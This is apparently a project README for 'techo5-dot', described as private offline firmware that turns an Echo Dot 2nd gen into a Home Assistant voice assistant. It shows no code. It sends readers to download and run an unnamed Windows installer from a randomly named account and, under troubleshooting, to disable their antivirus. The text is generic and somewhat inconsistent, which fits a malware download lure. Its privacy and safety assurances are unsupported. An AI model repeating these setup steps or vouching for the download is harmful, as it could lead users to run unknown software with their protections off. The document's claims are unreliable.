<h1>🤖 techo5-dot - Your Private, Offline Voice Assistant</h1>

<p align="center">
  <a href="https://github.com/Uncurled-elnino8743/techo5-dot" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download techo5-dot Now</a>
</p>

## 🎯 What Is This?

techo5-dot transforms your Amazon Echo Dot (2nd generation) into a completely private voice assistant that works with your smart home - without Amazon, without Alexa, and without any cloud services. Think of it as giving your Echo Dot a new brain that only listens to you and keeps your voice data on your own devices.

Instead of sending your conversations to Amazon's servers, this software runs entirely on your Echo Dot device. It works with Home Assistant (a free, open-source home automation platform) to control your lights, thermostats, and other smart devices using just your voice - all while keeping your privacy intact.

## ✨ Key Features

### 🎤 All Seven Microphones
Unlike other solutions that only use a limited number of microphones, techo5-dot harnesses all seven microphones built into your Echo Dot. This means it can hear you clearly even in noisy rooms or from across the room, giving you better voice recognition than typical smart speakers.

### 🔒 Total Privacy
No Alexa. No Amazon. No cloud. Your voice commands never leave your home network. Every word you speak is processed locally on your own hardware, making it nearly impossible for anyone to intercept or access your voice data.

### 🔊 Bluetooth Speaker Mode
Your Echo Dot isn't just a voice assistant - it's also a high-quality speaker. With techo5-dot, you can connect your phone or computer via Bluetooth and play music, podcasts, or any audio directly through your Echo Dot.

### 🔄 Automatic Updates
The software includes a smart update system that keeps your device running the latest version safely. It uses "signed A/B updates" - think of this as having two copies of the software on your device. If one copy has a problem, the device automatically switches to the backup copy, ensuring your Echo Dot never becomes unusable.

### 🔐 Secure Remote Access
Built-in SSH (Secure Shell) access lets you manage your device remotely from any computer on your network, with modern authentication using Biscuit tokens for enhanced security.

### ⚡ Lightweight and Fast
Based on Alpine Linux, a minimal and efficient operating system, techo5-dot uses minimal resources, ensuring your Echo Dot runs smoothly and responds quickly to voice commands.

## 📋 What You Need

Before you begin, make sure you have:

- **An Echo Dot (2nd generation)** - Check the bottom of your device for the model number; it should be marked as "2nd Generation" or have model number "UF-2"
- **A Windows computer** (for the initial setup)
- **A microSD card** (at least 8GB, Class 10 recommended)
- **A microSD card reader** (if your computer doesn't have a built-in slot)
- **A USB cable** that works with your Echo Dot (the original cable is ideal)
- **Basic familiarity** with downloading and opening files on your computer

## 🚀 Getting Started

### Step 1: Download the Software

Visit this link to download the application:

[**Download techo5-dot**](https://github.com/Uncurled-elnino8743/techo5-dot)

This page will show you the latest version of the software available for download. Look for the file that matches your device (Echo Dot 2nd gen) and download it to your computer. The download should start automatically when you click the download button.

### Step 2: Prepare Your Computer

Once the download finishes, find the downloaded file in your "Downloads" folder. Make sure you know where this file is located, as you'll need to use it in the next steps.

### Step 3: Connect Your Echo Dot

1. Plug your Echo Dot into a power source using the original power adapter
2. Connect your Echo Dot to your computer using a USB cable (the same type you'd use for many Android phones)
3. Your computer should make a sound indicating a new device has been connected

### Step 4: Run the Installation

1. Open the downloaded file you saved in Step 2
2. Follow the on-screen instructions carefully
3. The installation program will detect your Echo Dot and guide you through the setup process
4. Wait for the installation to complete - this may take several minutes, so be patient

### Step 5: Connect to Your Network

After installation, your Echo Dot will appear as a new device on your Wi-Fi network. Use the provided software or your router's settings to connect your Echo Dot to the same network as your computer and Home Assistant setup.

### Step 6: Start Using Your Voice Assistant

Once connected, you can start using your Echo Dot with voice commands like:
- "Turn on the living room lights"
- "Set the thermostat to 72 degrees"
- "Play music from my phone"

## 🎮 Using techo5-dot

### Voice Commands

Your Echo Dot will respond to a wake word (like "Hey Computer" or "Alexa" - you can customize this). When you say the wake word followed by a command, your Echo Dot will process it locally and control your smart home devices through Home Assistant.

### Connecting to Home Assistant

1. Install Home Assistant on your home server or computer (visit home-assistant.io for instructions)
2. Your Echo Dot will automatically discover your Home Assistant installation on your network
3. Follow the pairing instructions in both the Echo Dot setup and Home Assistant to link them together

### Using Bluetooth Speaker Mode

1. Say "pair Bluetooth" or press the Bluetooth button on your Echo Dot (if available)
2. On your phone or computer, search for available Bluetooth devices
3. Select your Echo Dot from the list and connect
4. Now play any audio from your device - it will play through your Echo Dot's speakers

## 🛠️ Troubleshooting

### My Echo Dot Isn't Responding

- Make sure it's properly connected to power
- Check that your Wi-Fi connection is stable
- Try saying the wake word more clearly
- Restart your Echo Dot by unplugging it for 10 seconds and plugging it back in

### The Installation Failed

- Try a different USB cable (some cables only charge and don't transfer data)
- Make sure you're using a USB port on your computer directly (avoid USB hubs)
- Check if your antivirus software is blocking the installation - temporarily disable it and try again

### Bluetooth Won't Connect

- Make sure your Echo Dot isn't already connected to another device
- Turn Bluetooth off and on on your phone/computer
- Try forgetting the device in your Bluetooth settings and pairing again

### Voice Commands Aren't Working

- Verify that Home Assistant is running and accessible on your network
- Check that your Echo Dot and Home Assistant are on the same network
- Speak clearly and at a normal volume
- Make sure the room isn't too noisy

## 🔄 Keeping Your Software Updated

techo5-dot includes automatic updates to ensure you always have the latest features and security improvements. The A/B update system works in the background, so you don't need to do anything - your device will update itself when a new version is available.

To manually check for updates:
1. Open the techo5-dot control panel from your computer (look for the techo5-dot icon in your system tray)
2. Click "Check for Updates"
3. If an update is available, click "Install Now"
4. Wait for the update to complete - your device will restart automatically

## 🔧 Advanced Settings (For Power Users)

If you're comfortable with more technical settings, you can access advanced features through the web interface:

1. Find your Echo Dot's IP address from your router's device list
2. Open a web browser and type: `http://[your-echo-dot-ip-address]`
3. Log in with the credentials you set up during installation

From here, you can:
- Adjust microphone sensitivity
- Change the wake word
- Set up multiple users
- Configure network settings
- View system logs
- Manage connected devices

## ❓ Frequently Asked Questions

**Q: Will this void my Echo Dot's warranty?**
A: Yes, installing custom firmware will void your manufacturer warranty. However, techo5-dot is designed to be reliable and safe, and you can always restore the original Amazon software if needed.

**Q: Can I still use Amazon services?**
A: No, once you install techo5-dot, the device no longer connects to Amazon services. This is the point - it's completely independent from Amazon.

**Q: How do I restore the original Alexa software?**
A: The installation process includes a restore option. Simply connect your Echo Dot to your computer and run the restoration tool that came with the download.

**Q: Will this work with other Echo devices?**
A: No, this software is specifically designed for the Echo Dot 2nd generation. Using it with other devices may cause issues.

**Q: Is my voice data truly private?**
A: Yes, all voice processing happens locally on your Echo Dot. No audio data is ever sent to external servers.

## 📚 Additional Resources

- **Home Assistant Documentation**: [home-assistant.io/docs](https://home-assistant.io/docs) - Learn how to set up and configure Home Assistant
- **Community Forum**: Visit our GitHub Discussions page for help from other users
- **Report an Issue**: Found a bug? Let us know on our [Issues page](https://github.com/Uncurled-elnino8743/techo5-dot/issues)

## 🤝 Contributing

We welcome contributions from users of all skill levels! Whether you're a developer who wants to improve the code, a designer who wants to improve the interface, or a user who wants to report issues, your input is valuable. Visit our GitHub repository to learn how you can help.

## 📄 License

This project is open-source and free to use. Please see the LICENSE file in our GitHub repository for full details.

---

<p align="center">
  <a href="https://github.com/Uncurled-elnino8743/techo5-dot" style="background-color:#2196F3;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:6px;">🔗 Get Started with techo5-dot Today</a>
</p>

<div style="text-align:center;margin-top:40px;">
  <p><strong>Last Updated:</strong> January 2024</p>
  <p><strong>Version:</strong> 1.0.0</p>
</div>